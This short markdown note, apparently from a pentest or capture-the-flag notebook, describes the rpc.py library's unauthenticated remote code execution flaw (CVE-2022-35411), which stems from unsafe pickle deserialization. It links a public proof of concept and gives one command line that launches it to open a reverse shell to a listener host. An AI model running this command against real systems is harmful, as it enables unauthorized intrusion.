# rpc.py

**rpc.py** is a lightweight Python library designed to facilitate remote procedure calls (RPC) over a network. It enables developers to expose Python functions or methods on a server and invoke them remotely from a client, simplifying distributed application communication. The library serializes data using Python's `pickle` module, which allows complex objects to be sent back and forth.

The rpc.py versions from `0.4.2` to `0.6.0` are susceptible to an **unauthenticated remote code execution (RCE)** vulnerability ([CVE-2022-35411](https://nvd.nist.gov/vuln/detail/CVE-2022-35411)). This arises from unsafe deserialization of untrusted data using Python’s `pickle` module. Because rpc.py accepts serialized objects from clients without proper validation or authentication, an attacker can craft a malicious payload that, when deserialized by the server, executes arbitrary system commands.

A python-based [PoC](https://github.com/CSpanias/rpc-rce.py) is available for getting a reverse shell right away:

```bash
python3 rpc-rce.py --lhost 10.10.14.1 --lport 9001
```
